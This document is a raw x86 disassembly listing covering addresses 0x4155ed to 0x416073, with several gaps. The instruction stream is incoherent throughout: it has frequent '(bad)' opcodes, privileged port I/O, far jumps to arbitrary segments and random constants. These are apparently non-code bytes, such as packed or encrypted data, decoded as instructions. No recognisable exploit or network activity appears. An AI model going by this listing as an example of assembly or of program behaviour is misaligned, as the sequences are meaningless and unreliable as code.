  4155ed:	jmp    0x4155a6
  4155ef:	je     0x41559d
  4155f1:	push   ss
  4155f2:	frstor [eax-0x7813889a]
  4155f8:	adc    BYTE PTR [ebp+edi*1-0x11],0x53
  4155fd:	dec    esi
  4155fe:	or     al,0x0
  415600:	lods   eax,DWORD PTR ds:[esi]
  415601:	ins    DWORD PTR es:[edi],dx
  415602:	outs   dx,BYTE PTR ds:[esi]
  415603:	xor    esi,DWORD PTR [ebp+0x7c728296]
  415609:	and    BYTE PTR [eax+0x47],0xfb
  41560d:	xchg   ebp,eax
  41560e:	sar    edi,1
  415610:	ret    
  415611:	push   ebp
  415612:	jbe    0x415672
  415614:	dec    esi
  415615:	adc    ebx,esp
  415617:	aam    0x7b
  415619:	or     BYTE PTR [edi+0x1d],bh
  41561c:	bound  ebx,QWORD PTR [esp+esi*4-0x64]
  415620:	retf   0x82fb
  415623:	add    BYTE PTR [ebp+0x1a],cl
  415626:	aaa    
  415627:	and    ch,al
  415629:	dec    ecx
  41562a:	das    
  41562b:	imul   DWORD PTR [eax]
  41562d:	or     eax,0xea1e6146
  415632:	repnz add DWORD PTR [edi+0x0],esi
	...
  415695:	add    BYTE PTR [ebp-0x66],ch
  415698:	mov    esp,0xfd67ff45
  41569d:	mov    edx,0xaffd40cb
  4156a2:	jg     0x41564f
  4156a4:	ins    BYTE PTR es:[edi],dx
  4156a5:	sub    ebx,DWORD PTR [ebp-0x21]
  4156a8:	add    BYTE PTR [eax],al
  4156aa:	pop    es
  4156ab:	add    DWORD PTR [eax],eax
  4156ad:	add    BYTE PTR [ebx],ah
  4156af:	in     al,dx
  4156b0:	jmp    0xbae0a7c0
  4156b5:	jg     0x415736
  4156b7:	and    ch,dh
  4156b9:	pop    edx
  4156ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156bb:	mov    bl,BYTE PTR [eax]
  4156bd:	idiv   DWORD PTR [ecx+eax*2-0x2f9798d7]
  4156c4:	and    BYTE PTR [edx+0x1e],0x92
  4156c8:	test   DWORD PTR [edi-0x2c930395],esi
  4156ce:	push   edi
  4156cf:	sub    al,0xc3
  4156d1:	sbb    ah,0xfb
  4156d4:	push   ecx
  4156d5:	out    0xc5,al
  4156d7:	push   edi
  4156d8:	mov    esi,fs
  4156da:	les    edi,FWORD PTR [esi-0x3f55eea2]
  4156e0:	retf   0xad84
  4156e3:	int    0xc9
  4156e5:	ins    DWORD PTR es:[edi],dx
  4156e6:	adc    esi,DWORD PTR [ebp+ebp*4+0x5bb7aad]
  4156ed:	mov    dl,0x1e
  4156ef:	push   es
  4156f0:	adc    dl,BYTE PTR [edi-0xd8aa58a]
  4156f6:	add    al,dh
  4156f8:	add    ecx,esp
  4156fa:	xchg   edi,eax
  4156fb:	lahf   
  4156fc:	gs pop edi
  4156fe:	push   esi
  4156ff:	mov    edi,0x14efe7f2
  415704:	push   ebx
  415705:	shl    edi,cl
  415707:	sbb    BYTE PTR [eax],dh
  415709:	inc    edx
  41570a:	dec    esi
  41570b:	mov    eax,ds:0xbffdcc7a
  415710:	push   esi
  415711:	or     DWORD PTR [ebx+eiz*2],edx
  415714:	sar    BYTE PTR ds:[edx],1
  415717:	sahf   
  415718:	das    
  415719:	sub    DWORD PTR [edx+0x2ae88880],0x67dd4e6f
  415723:	aaa    
  415724:	lea    ebx,[esi+ecx*8]
  415727:	mov    edi,0xb1e8391f
  41572c:	xchg   ebp,eax
  41572d:	sar    BYTE PTR [ebx+0x19],1
  415730:	push   esp
  415731:	xchg   ebp,eax
  415732:	and    al,dl
  415734:	mov    WORD PTR [edi+edi*4-0x24],?
  415738:	loope  0x41573c
  41573a:	xor    eax,0xd8205cfa
  41573f:	(bad)  
  415740:	ja     0x415744
  415742:	das    
  415743:	inc    ebp
  415744:	sub    edx,DWORD PTR [eax+0x6c826a6c]
  41574a:	inc    edx
  41574b:	pop    eax
  41574c:	or     al,0x23
  41574e:	ja     0x415781
  415750:	push   cs
  415751:	outs   dx,BYTE PTR ds:[esi]
  415752:	xor    DWORD PTR [eax-0x20],esi
  415755:	jne    0x4157c2
  415757:	lock outs dx,BYTE PTR ds:[esi]
  415759:	fcom   QWORD PTR [esp+eax*2-0x1fdbae49]
  415760:	retf   0xe89
  415763:	(bad)  
  415764:	cli    
  415765:	mov    esp,DWORD PTR [eax+eax*4]
  415768:	dec    eax
  415769:	sub    al,0xc6
  41576b:	(bad)  [ebx+edi*2]
  41576e:	rcl    edx,1
  415770:	aas    
  415771:	cs pop eax
  415773:	test   DWORD PTR ds:0xe8ee9b1f,ebp
  415779:	xchg   DWORD PTR [ecx-0x612ff844],edx
  41577f:	addr16 pop es
  415781:	mov    bl,0xbe
  415783:	out    dx,al
  415784:	jl     0x415708
  415786:	mov    bl,0x9f
  415788:	ror    DWORD PTR [ebp*4+0x491d27c6],cl
  41578f:	popf   
  415790:	daa    
  415791:	jbe    0x4157d0
  415793:	xor    dl,al
  415795:	retf   
  415796:	fild   QWORD PTR [ebx]
  415798:	sbb    eax,0xd5bad61f
  41579d:	push   esi
  41579e:	es jmp 0x4157ac
  4157a1:	aam    0xc2
  4157a3:	out    0xaf,eax
  4157a5:	fmul   DWORD PTR [esi]
  4157a7:	inc    esp
  4157a8:	mov    cl,0xec
  4157aa:	cdq    
  4157ab:	scas   eax,DWORD PTR es:[edi]
  4157ac:	jbe    0x415813
  4157ae:	call   0xeedb:0x2fd3c7ed
	...
  415815:	add    bl,cl
  415817:	(bad)  
  415818:	xchg   ebx,eax
  415819:	in     al,dx
  41581a:	mov    bh,0xed
  41581c:	(bad)  
  41581d:	inc    DWORD PTR [ecx-0x6d51961d]
  415823:	push   esi
  415824:	rcr    ebp,cl
  415826:	fs loopne 0x415829
  415829:	add    BYTE PTR [edi],al
  41582b:	add    DWORD PTR [eax],eax
  41582d:	add    ch,dh
  41582f:	loopne 0x4157db
  415831:	pop    ebx
  415832:	jge    0x41589f
  415834:	push   ss
  415835:	sbb    edi,DWORD PTR [edi+eax*2-0x678f6e36]
  41583c:	iret   
  41583d:	cmc    
  41583e:	ret    
  41583f:	inc    ebx
  415840:	inc    ebp
  415841:	push   es
  415842:	mov    cl,0xb3
  415844:	repnz cmp dl,BYTE PTR [edx]
  415847:	out    0xe0,ax
  41584a:	inc    ebp
  41584b:	nop
  41584c:	popf   
  41584d:	ret    
  41584e:	mov    ah,0x36
  415850:	lea    eax,[ebp-0x6f]
  415853:	adc    eax,0xfcb6edd4
  415858:	cmc    
  415859:	sbb    bh,BYTE PTR [eax+0x35]
  41585c:	jmp    0x2543:0x6b368f1c
  415863:	jecxz  0x41582f
  415865:	dec    ebx
  415866:	mov    ebx,0x718a96df
  41586b:	sub    BYTE PTR [ecx+0x4c5195e8],ch
  415871:	add    eax,0x16b55c06
  415876:	daa    
  415877:	mov    dh,0x70
  415879:	sahf   
  41587a:	sub    edi,ebx
  41587c:	lods   eax,DWORD PTR ds:[esi]
  41587d:	call   0xe8462a93
  415882:	loopne 0x415888
  415884:	ins    BYTE PTR es:[edi],dx
  415885:	mov    cl,0x56
  415887:	dec    eax
  415888:	xchg   ebx,eax
  415889:	dec    edx
  41588a:	in     al,dx
  41588b:	xor    eax,0x9524849f
  415890:	leave  
  415891:	adc    BYTE PTR [ebx+0x1b],al
  415894:	inc    esi
  415895:	push   ss
  415896:	push   ss
  415897:	loopne 0x41589e
  415899:	sbb    eax,0xa54f1999
  41589e:	and    al,0x3
  4158a0:	push   esp
  4158a1:	test   al,0x7b
  4158a3:	test   DWORD PTR [ebx-0x7923d095],0xfe768c5c
  4158ad:	test   eax,0x12afa8b7
  4158b2:	out    0xe3,eax
  4158b4:	(bad)  
  4158b5:	in     eax,0xc5
  4158b7:	add    eax,0xfd4abd83
  4158bc:	lahf   
  4158bd:	pop    ss
  4158be:	cmc    
  4158bf:	mov    eax,0x192217ab
  4158c4:	aaa    
  4158c5:	lds    eax,FWORD PTR [ebx-0x80]
  4158c8:	bound  esp,QWORD PTR [ebp+0x6]
  4158cb:	icebp  
  4158cc:	loopne 0x4158c8
  4158ce:	lea    esi,[ebx]
  4158d0:	add    esi,DWORD PTR [ecx+0x7e7a43b9]
  4158d6:	mov    dl,0xcc
  4158d8:	sub    DWORD PTR [eax],ebx
  4158da:	loop   0x4158f9
  4158dc:	jnp    0x41594c
  4158de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158df:	xchg   esi,eax
  4158e0:	pop    ebp
  4158e1:	out    0x2d,al
  4158e3:	jmp    0x415936
  4158e5:	xor    ebx,DWORD PTR [ebx-0x148879bf]
  4158eb:	rcl    BYTE PTR [ecx-0x32030f6e],1
  4158f1:	xchg   ebx,eax
  4158f2:	in     al,0x2e
  4158f4:	mov    cs,ecx
  4158f6:	ret    0xbc04
  4158f9:	push   ecx
  4158fa:	inc    esi
  4158fb:	add    dl,BYTE PTR [ecx+0x6d]
  4158fe:	pop    ecx
  4158ff:	(bad)
  415902:	lds    edx,FWORD PTR [edi-0x32]
  415905:	shl    bl,0x88
  415908:	pop    ebx
  415909:	dec    edi
  41590a:	and    al,0xaa
  41590c:	pop    ss
  41590d:	jns    0x41592c
  41590f:	mov    ah,0xe
  415911:	add    BYTE PTR [ebx-0x6b],cl
  415914:	inc    esp
  415915:	mov    fs,WORD PTR [esi+0x270a4d0e]
  41591b:	test   ebx,esp
  41591d:	in     al,dx
  41591e:	ret    
  41591f:	push   ss
  415920:	sbb    DWORD PTR [edi-0x7d],esi
  415923:	pushw  ds
  415925:	inc    esi
  415926:	add    al,0x9a
  415928:	dec    esp
  415929:	push   eax
  41592a:	xchg   edx,eax
  41592b:	xchg   ah,ah
  41592d:	or     al,0xdc
  41592f:	adc    dl,0x88
  415932:	frstor ds:0xa2
	...
  415994:	add    BYTE PTR [eax],al
  415996:	inc    ebp
  415997:	mov    BYTE PTR [edi+esi*2],ch
  41599a:	in     eax,dx
  41599b:	neg    DWORD PTR [edi-0x46]
  41599e:	es jge 0x415944
  4159a1:	int    0x90
  4159a3:	imul   edx,ebp,0x71
  4159a6:	imul   esp,ecx,0x0
  4159a9:	add    BYTE PTR [edi],al
  4159ab:	add    DWORD PTR [eax],eax
  4159ad:	add    BYTE PTR [ebx-0x8e62d80],cl
  4159b3:	out    dx,al
  4159b4:	aas    
  4159b5:	in     al,0x8f
  4159b7:	mov    cl,0xf7
  4159b9:	push   esi
  4159ba:	mov    ch,0x9
  4159bc:	add    DWORD PTR [esp+ecx*1],edx
  4159bf:	shl    eax,1
  4159c1:	(bad)  
  4159c2:	mov    cl,0x90
  4159c4:	xor    al,0x54
  4159c6:	clc    
  4159c7:	and    DWORD PTR [edx+0x6b],esi
  4159ca:	repz mov al,0x53
  4159cd:	dec    BYTE PTR [ebp+0x1f]
  4159d0:	cmp    al,0xfb
  4159d2:	and    BYTE PTR [edi+0x585efae8],ch
  4159d8:	imul   al
  4159da:	pop    ecx
  4159db:	pop    edx
  4159dd:	and    esi,DWORD PTR [edi+0x7c]
  4159e0:	mov    ebx,0xcd41ef8d
  4159e5:	and    ebp,DWORD PTR [eax-0x151f991d]
  4159eb:	enter  0x45f9,0xd5
  4159ef:	enter  0x2f0f,0x44
  4159f3:	cdq    
  4159f4:	xor    DWORD PTR [esi+eax*1],ebp
  4159f7:	push   esp
  4159f8:	jmp    0x415a1f
  4159fa:	xchg   ecx,eax
  4159fb:	or     ch,BYTE PTR [ecx+0x74a28b13]
  415a01:	mov    esi,0xa969b3d6
  415a06:	(bad)  
  415a08:	and    DWORD PTR [edi-0x59],ebx
  415a0b:	popf   
  415a0c:	call   0x8e553145
  415a11:	in     eax,0xc8
  415a13:	mov    bl,0x7f
  415a15:	fimul  WORD PTR [edx+0x7e]
  415a18:	pop    ebp
  415a19:	idiv   DWORD PTR [ecx]
  415a1b:	ss inc ebp
  415a1d:	bound  edi,QWORD PTR [ecx]
  415a1f:	rol    bl,cl
  415a21:	mov    edx,ecx
  415a23:	mov    edi,0x8ad802c9
  415a28:	pop    ss
  415a29:	push   ebp
  415a2a:	mov    edx,0x95087d92
  415a2f:	adc    DWORD PTR [ebp-0x39],ecx
  415a32:	fcom   DWORD PTR [esi-0x5]
  415a35:	or     DWORD PTR [ecx+0x53],0xffffffcd
  415a39:	in     eax,0xb5
  415a3b:	mov    BYTE PTR [ebx],bh
  415a3d:	popa   
  415a3e:	mov    edi,esp
  415a40:	jno    0x4159d6
  415a42:	das    
  415a43:	pop    ss
  415a44:	pop    ebx
  415a45:	nop
  415a46:	les    ebx,FWORD PTR [edx-0x43010a50]
  415a4c:	hlt    
  415a4d:	aam    0x0
  415a4f:	fisttp DWORD PTR [esi+0x78]
  415a52:	inc    ebp
  415a53:	pop    es
  415a54:	sub    al,0x59
  415a56:	stos   BYTE PTR es:[edi],al
  415a57:	dec    eax
  415a58:	loop   0x415acd
  415a5a:	xchg   esp,eax
  415a5b:	out    dx,al
  415a5c:	(bad)  
  415a5d:	pop    esi
  415a5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a5f:	sbb    eax,0xd3336eed
  415a64:	pop    esi
  415a65:	jnp    0x415a5b
  415a67:	sti    
  415a68:	dec    ecx
  415a69:	add    bl,BYTE PTR [ecx+0x5]
  415a6c:	or     eax,0x99740192
  415a71:	idiv   BYTE PTR [edx]
  415a73:	outs   dx,BYTE PTR ds:[esi]
  415a74:	push   esp
  415a75:	xor    DWORD PTR [edx+0x307966d0],edi
  415a7b:	fs push 0x5d
  415a7e:	popf   
  415a7f:	adc    eax,0x4233b8eb
  415a84:	pusha  
  415a85:	arpl   sp,bx
  415a87:	cmc    
  415a88:	fstp   TBYTE PTR [ebx-0x2965459b]
  415a8e:	sbb    eax,DWORD PTR [ebx-0x5b]
  415a91:	and    dh,BYTE PTR [ecx]
  415a93:	pop    esi
  415a94:	jb     0x415ae9
  415a96:	fidivr WORD PTR [edx+0x6388babf]
  415a9c:	aad    0xb2
  415a9e:	(bad)  
  415a9f:	push   ss
  415aa0:	or     BYTE PTR [esi-0x45],0x25
  415aa4:	adc    al,0x59
  415aa6:	mov    edx,0xc320f060
  415aab:	xchg   ebp,eax
  415aac:	cli    
  415aad:	aaa    
  415aae:	in     al,dx
  415aaf:	leave  
  415ab0:	sub    eax,0x852120fa
	...
  415b15:	add    bh,bl
  415b17:	mov    esi,0xbb659205
  415b1c:	(bad)  
  415b1e:	jge    0x415aff
  415b20:	nop
  415b21:	mov    al,ds:0x745dca22
  415b26:	jb     0x415b0a
  415b28:	add    BYTE PTR [eax],al
  415b2a:	pop    es
  415b2b:	add    DWORD PTR [eax],eax
  415b2d:	add    BYTE PTR [edi],bl
  415b2f:	xor    ebp,esi
  415b31:	sbb    ch,BYTE PTR [ecx]
  415b33:	js     0x415b92
  415b35:	loope  0x415afd
  415b37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b38:	(bad)  
  415b39:	loope  0x415aeb
  415b3b:	inc    eax
  415b3c:	test   DWORD PTR [edx-0x383be551],edi
  415b42:	and    eax,0x7d528b05
  415b47:	cwde   
  415b48:	les    ebp,FWORD PTR [eax-0x16810fa1]
  415b4e:	sub    DWORD PTR [ebp+0x54],ebp
  415b51:	pop    es
  415b52:	and    al,0x77
  415b54:	test   eax,0x268bf983
  415b59:	call   0x716c:0x21ae38e5
  415b60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b61:	and    DWORD PTR [esi+0x2d4177c3],ecx
  415b67:	adc    eax,0x4e02240f
  415b6c:	out    0x84,eax
  415b6e:	jle    0x415b6f
  415b70:	or     edx,ebx
  415b72:	mov    edx,0x7284beb2
  415b77:	mov    al,ds:0x1403b479
  415b7c:	jns    0x415b70
  415b7e:	push   es
  415b7f:	mov    ecx,0x2ad85b65
  415b84:	pop    ecx
  415b85:	mov    al,ds:0x8ecc9591
  415b8a:	test   al,0x77
  415b8c:	inc    esp
  415b8d:	stos   BYTE PTR es:[edi],al
  415b8e:	add    al,0x2d
  415b90:	lock pop ss
  415b92:	cmp    bh,bh
  415b94:	mov    BYTE PTR [edi-0x6ab3630c],ch
  415b9a:	add    BYTE PTR [edx+0x75f2c526],ah
  415ba0:	jmp    0x350d:0x100c11c5
  415ba7:	clc    
  415ba8:	push   eax
  415ba9:	sub    DWORD PTR [edi+0x32],ecx
  415bac:	jmp    0x1bae:0x27efd0ee
  415bb3:	and    al,0x32
  415bb5:	pop    ds
  415bb6:	mov    cl,0x8d
  415bb8:	push   ss
  415bb9:	pop    esp
  415bba:	leave  
  415bbb:	popf   
  415bbc:	mov    ?,ebp
  415bbe:	lds    edi,FWORD PTR [edi+eiz*1-0x56]
  415bc2:	aaa    
  415bc3:	retf   0xc0f2
  415bc6:	sub    ah,BYTE PTR cs:[edx-0x4635be0a]
  415bcd:	adc    ah,BYTE PTR [edx]
  415bcf:	div    BYTE PTR [edi-0x33f93848]
  415bd5:	retfw  
  415bd7:	lahf   
  415bd8:	sub    DWORD PTR [ecx-0x40b3d932],ebp
  415bde:	cmp    al,0x40
  415be0:	(bad)
  415be3:	jnp    0x415c3b
  415be5:	mov    eax,ds:0x32781b01
  415bea:	jp     0x415bab
  415bec:	mov    ds:0x24f111c2,eax
  415bf1:	js     0x415bc4
  415bf3:	sub    esp,ebp
  415bf5:	or     ecx,ebx
  415bf7:	(bad)
  415bfa:	dec    ecx
  415bfb:	shr    DWORD PTR [ecx+0x44],cl
  415bfe:	(bad)  
  415bff:	cmc    
  415c00:	mov    eax,0x9f14f8f6
  415c05:	or     eax,DWORD PTR [edi]
  415c07:	fcom   DWORD PTR [edx-0x75]
  415c0a:	or     DWORD PTR [ebp+0x180f358b],0x7021d05c
  415c14:	aam    0x6a
  415c16:	inc    edi
  415c17:	xchg   DWORD PTR [ecx],ebx
  415c19:	push   esi
  415c1a:	scas   al,BYTE PTR es:[edi]
  415c1b:	loop   0x415c1f
  415c1d:	loopne 0x415c1f
  415c1f:	cmp    ah,BYTE PTR [esi-0x36676d6a]
  415c25:	sbb    bh,bl
  415c27:	mov    BYTE PTR [eax+0x6236bb81],ah
  415c2d:	jbe    0x415c76
  415c2f:	jp     0x415c4b
  415c31:	jmp    0xbe2188
	...
  415c96:	cmp    dl,BYTE PTR [eax]
  415c98:	mov    edi,0xbbbfbf3c
  415c9d:	push   ss
  415c9e:	jno    0x415d07
  415ca0:	mov    esi,0x78cbb20f
  415ca5:	xor    BYTE PTR [ecx-0x1d],bh
  415ca8:	add    BYTE PTR [eax],al
  415caa:	pop    es
  415cab:	add    DWORD PTR [eax],eax
  415cad:	add    BYTE PTR [esi-0x27],ch
  415cb0:	int    0x61
  415cb2:	loope  0x415cad
  415cb4:	inc    esp
  415cb5:	push   bp
  415cb7:	and    BYTE PTR [esi+0x66],ch
  415cba:	popf   
  415cbb:	fs call 0x19e:0xcc0e6ce3
  415cc3:	xor    DWORD PTR ds:0x3342bfc4,0x75
  415cca:	jbe    0x415d24
  415ccc:	sub    esp,esp
  415cce:	and    cl,cl
  415cd0:	jmp    0x84b699cf
  415cd5:	out    dx,al
  415cd6:	fs adc ebp,edx
  415cd9:	xchg   ecx,eax
  415cda:	xor    BYTE PTR [eax+ebx*4-0x30],dh
  415cde:	test   BYTE PTR [ebx+0x4d],dl
  415ce1:	add    BYTE PTR [esi+0x72c28c22],bl
  415ce7:	retf   0x2862
  415cea:	mov    eax,ds:0x753f16d5
  415cef:	push   ds
  415cf0:	pop    es
  415cf1:	sub    BYTE PTR [edi-0x75],0x2e
  415cf5:	pop    ds
  415cf6:	push   0xc59205a0
  415cfb:	mov    WORD PTR [edx],?
  415cfd:	imul   edi,DWORD PTR [ebp+0x2a0ebc56],0xa8d25a1a
  415d07:	call   0x23e0:0xf450b921
  415d0e:	retf   
  415d0f:	imul   eax,DWORD PTR [esi-0x1a],0x2bb0bdf4
  415d16:	inc    ebp
  415d17:	sbb    eax,0xc856cb66
  415d1c:	vpmaddwd ymm1,ymm6,ymm5
  415d20:	add    BYTE PTR [ebx+0x246afe5e],cl
  415d26:	cmp    bl,BYTE PTR [ecx]
  415d28:	inc    ecx
  415d29:	daa    
  415d2a:	out    dx,al
  415d2b:	jmp    0x325a7503
  415d30:	jmp    0x5004:0x6f1e1466
  415d37:	sub    al,0x80
  415d39:	cwde   
  415d3a:	sbb    ebx,DWORD PTR [ebx+0x4]
  415d3d:	sahf   
  415d3e:	push   ds
  415d3f:	mov    ds:0xd9914825,eax
  415d44:	mov    bl,BYTE PTR [ebx]
  415d46:	push   ss
  415d47:	daa    
  415d48:	and    eax,0x9ea42b3b
  415d4d:	sbb    edi,DWORD PTR [ecx+0xfe639ee]
  415d53:	jmp    0x415cdd
  415d55:	(bad)  
  415d56:	(bad)  
  415d57:	stos   BYTE PTR es:[edi],al
  415d58:	jmp    0x415dce
  415d5a:	aas    
  415d5b:	jge    0x415dd7
  415d5d:	or     dl,BYTE PTR [edi]
  415d5f:	add    al,0x1e
  415d61:	out    0xfc,al
  415d63:	les    eax,FWORD PTR [edx-0x37]
  415d66:	(bad)  
  415d67:	cld    
  415d68:	shr    DWORD PTR [eax],cl
  415d6a:	lea    ecx,[ebx+ebx*2-0x47]
  415d6e:	jl     0x415dba
  415d70:	mov    eax,0x1cf12c7d
  415d75:	and    al,0x2f
  415d77:	cmp    al,BYTE PTR [ebx]
  415d79:	xchg   ebp,eax
  415d7a:	inc    eax
  415d7b:	test   DWORD PTR [esi-0x63],0x6b0f44ef
  415d82:	mov    ds:0xe6825c52,al
  415d87:	int3   
  415d88:	xchg   BYTE PTR [edx],al
  415d8a:	sbb    dl,al
  415d8c:	cmp    BYTE PTR [eax+edi*8+0x1b],bl
  415d90:	call   0x527cf779
  415d95:	or     eax,0x7c33ee52
  415d9a:	pop    es
  415d9b:	add    al,0x56
  415d9d:	mov    eax,ds:0xa6cc0d5b
  415da2:	mov    cl,bl
  415da4:	(bad)  
  415da5:	mov    ecx,0x103e1cfd
  415daa:	pushf  
  415dab:	pop    ss
  415dac:	push   es
  415dad:	lods   al,BYTE PTR ds:[esi]
  415dae:	and    esp,DWORD PTR [esi]
  415db0:	adc    ebp,DWORD PTR [ebx]
  415db2:	daa    
  415db3:	rcl    BYTE PTR [ecx],cl
	...
  415e15:	add    dh,ch
  415e17:	repnz cmc 
  415e19:	add    edi,ebp
  415e1b:	pop    es
  415e1c:	(bad)  
  415e1d:	call   DWORD PTR [eax]
  415e1f:	mov    eax,ds:0x91375606
  415e24:	inc    eax
  415e25:	sub    eax,0xe480
  415e2a:	pop    es
  415e2b:	add    DWORD PTR [eax],eax
  415e2d:	add    BYTE PTR [ebx],bh
  415e2f:	sbb    BYTE PTR [edx-0x2044a3fc],0x7b
  415e36:	and    DWORD PTR [eax-0xe96755f],0x5e
  415e3d:	pop    es
  415e3e:	lock mov ds:0x46cf8c76,eax
  415e44:	pop    ebp
  415e45:	mov    esp,0x6440836b
  415e4a:	icebp  
  415e4b:	jge    0x415e9a
  415e4d:	enter  0xe75b,0xa0
  415e51:	xchg   edx,eax
  415e52:	int    0xb0
  415e54:	mov    eax,ds:0x49c374b8
  415e59:	sbb    BYTE PTR [ecx-0x49179c53],0xfb
  415e60:	stc    
  415e61:	mov    bh,0xba
  415e63:	or     dh,BYTE PTR [eax-0x44bf4ced]
  415e69:	fld    TBYTE PTR [ebp+0x192595d3]
  415e6f:	xchg   edi,eax
  415e70:	lea    edx,[bx+di]
  415e73:	out    0x73,eax
  415e75:	mov    ecx,ds
  415e77:	xchg   ebp,eax
  415e78:	push   esp
  415e79:	mov    bl,0x9
  415e7b:	xor    DWORD PTR [ecx-0x12ec0b16],esp
  415e81:	in     eax,0x67
  415e83:	scas   eax,DWORD PTR es:[edi]
  415e84:	cmp    edi,DWORD PTR [edx-0x2c]
  415e87:	in     al,dx
  415e88:	push   edx
  415e89:	into   
  415e8a:	pop    esp
  415e8b:	mov    ebx,0x4f6a2e0c
  415e90:	loope  0x415e70
  415e92:	std    
  415e93:	xchg   esp,eax
  415e94:	in     eax,0x5c
  415e96:	ret    
  415e97:	(bad)  
  415e98:	aas    
  415e99:	jae    0x415e65
  415e9b:	enter  0xfac6,0xd5
  415e9f:	hlt    
  415ea0:	inc    esp
  415ea1:	jle    0x415f01
  415ea3:	retf   0x6fe6
  415ea6:	rcl    ebx,0x34
  415ea9:	(bad)  
  415eab:	call   0x5a84fe03
  415eb0:	(bad)
  415eb4:	mov    ds:0x71ce2a7c,eax
  415eb9:	pop    esp
  415eba:	dec    esp
  415ebb:	inc    ebx
  415ebc:	jp     0x415e63
  415ebe:	jno    0x415e61
  415ec0:	inc    ebx
  415ec1:	test   DWORD PTR [eax-0x5d],esi
  415ec4:	adc    DWORD PTR [ebp+0x8651a8],edi
  415eca:	fld    DWORD PTR [ebp-0x1fadfd]
  415ed0:	xor    al,0x3a
  415ed2:	mov    al,ds:0xef7802ea
  415ed7:	push   cs
  415ed8:	in     eax,dx
  415ed9:	adc    al,0xf2
  415edb:	sbb    ecx,DWORD PTR [edi+ecx*2]
  415ede:	fst    DWORD PTR [ebx+0x51]
  415ee1:	dec    ecx
  415ee2:	and    BYTE PTR [esi],0x80
  415ee5:	rol    BYTE PTR [edi+0x346a11f0],cl
  415eeb:	xchg   edi,eax
  415eec:	mov    WORD PTR [edx-0x49b01fc8],fs
  415ef2:	retf   0x20f1
  415ef5:	add    edx,esp
  415ef7:	add    DWORD PTR [ecx],edi
  415ef9:	mov    ?,WORD PTR [edx]
  415efb:	push   ds
  415efc:	xchg   edi,eax
  415efd:	sub    eax,0x539219c9
  415f02:	mov    ah,0x9f
  415f04:	pop    esp
  415f05:	and    DWORD PTR [eax],ecx
  415f07:	test   DWORD PTR [ebp+eax*1-0x7fd53edf],ebx
  415f0e:	(bad)  
  415f0f:	hlt    
  415f10:	inc    ecx
  415f11:	(bad)  
  415f12:	jns    0x415f60
  415f14:	(bad)  
  415f15:	mov    al,0x21
  415f17:	push   0x67
  415f19:	or     DWORD PTR [esi],edi
  415f1b:	jne    0x415f85
  415f1d:	sub    BYTE PTR [ecx+0x22af6375],bl
  415f23:	xchg   edi,eax
  415f24:	call   0x9a70:0xc151a1f7
  415f2b:	add    eax,esi
  415f2d:	shl    DWORD PTR [esi+0x5e2a9ff0],cl
  415f33:	sub    al,0xb1
	...
  415f95:	add    BYTE PTR [edi],dl
  415f97:	mov    BYTE PTR [esi-0x6e],ch
  415f9a:	push   esi
  415f9c:	dec    DWORD PTR [ebp+0x1b0aa13e]
  415fa2:	loopne 0x415f59
  415fa4:	jecxz  0x415f8c
  415fa6:	xchg   ebp,esp
  415fa8:	add    BYTE PTR [eax],al
  415faa:	pop    es
  415fab:	add    DWORD PTR [eax],eax
  415fad:	add    BYTE PTR [ebx+edx*1-0x1f3bdefe],cl
  415fb4:	rcr    ch,cl
  415fb6:	(bad)  
  415fb7:	jp     0x415fa8
  415fb9:	mov    esp,0x6b0935ef
  415fbe:	add    BYTE PTR [edi+0x4f95656c],al
  415fc4:	mov    dl,0xcb
  415fc6:	in     al,dx
  415fc7:	aaa    
  415fc8:	xchg   edx,eax
  415fc9:	(bad)  
  415fca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fcb:	mov    bl,0x8b
  415fcd:	jl     0x415f68
  415fcf:	mov    eax,0xc5cae467
  415fd4:	cmp    al,0xbe
  415fd6:	dec    ebx
  415fd7:	bound  ecx,QWORD PTR [esi-0x68]
  415fda:	fidiv  WORD PTR [esi+0x4c]
  415fdd:	out    0x44,eax
  415fdf:	sub    edx,DWORD PTR ds:0x3a3aad43
  415fe5:	xchg   ebp,eax
  415fe6:	fld    DWORD PTR [eax+0xccba8ad]
  415fec:	(bad)  
  415fed:	packssdw mm1,QWORD PTR [edi-0x32]
  415ff1:	inc    esi
  415ff2:	and    BYTE PTR [ebx+ebp*1-0x43],dl
  415ff6:	sbb    al,0x43
  415ff8:	retf   
  415ff9:	es xchg edi,eax
  415ffb:	sti    
  415ffc:	imul   DWORD PTR [ecx+0x6325be43]
  416002:	cmp    DWORD PTR [edx-0x44de9a3f],esp
  416008:	jb     0x415fc4
  41600a:	push   edi
  41600b:	add    DWORD PTR [ecx+ecx*1-0x3a],0x69d37423
  416013:	mov    al,0x64
  416015:	jmp    0x415fa6
  416017:	in     eax,dx
  416018:	(bad)  
  416019:	mov    cl,0x30
  41601b:	lods   eax,DWORD PTR ds:[esi]
  41601c:	(bad)  
  41601d:	push   ecx
  41601e:	test   eax,0x91b1574e
  416023:	adc    bl,ah
  416025:	outs   dx,DWORD PTR ds:[esi]
  416026:	sub    BYTE PTR [edx-0x1cdbe93],cl
  41602c:	jnp    0x416098
  41602e:	(bad)  
  41602f:	mov    ch,0xe6
  416031:	pushf  
  416032:	adc    ecx,ebx
  416034:	pop    ebp
  416035:	out    dx,eax
  416036:	xor    esi,DWORD PTR [ebx-0x7f]
  416039:	pop    ebp
  41603a:	lods   al,BYTE PTR ds:[esi]
  41603b:	enter  0xb64a,0x1f
  41603f:	rcl    ch,cl
  416041:	(bad)  
  416042:	mov    ebp,0x7f23b7f4
  416047:	imul   eax,DWORD PTR [esi+0x7e20b534],0x830228f
  416051:	sub    al,0xe7
  416053:	fxch   st(3)
  416055:	bound  edi,QWORD PTR [ebx]
  416057:	jecxz  0x41603c
  416059:	push   ecx
  41605a:	addr16 xchg edx,eax
  41605c:	mov    edx,0x2952917f
  416061:	pop    edx
  416062:	mov    ds:0xf72ffd4f,al
  416067:	ins    DWORD PTR es:[edi],dx
  416068:	dec    ebx
  416069:	add    edx,ebx
  41606b:	aaa    
  41606c:	hlt    
  41606d:	or     al,0xd7
  41606f:	xlat   BYTE PTR ds:[ebx]
  416070:	xchg   esp,eax
  416071:	xchg   DWORD PTR [ecx],esp
  416073:	popf   
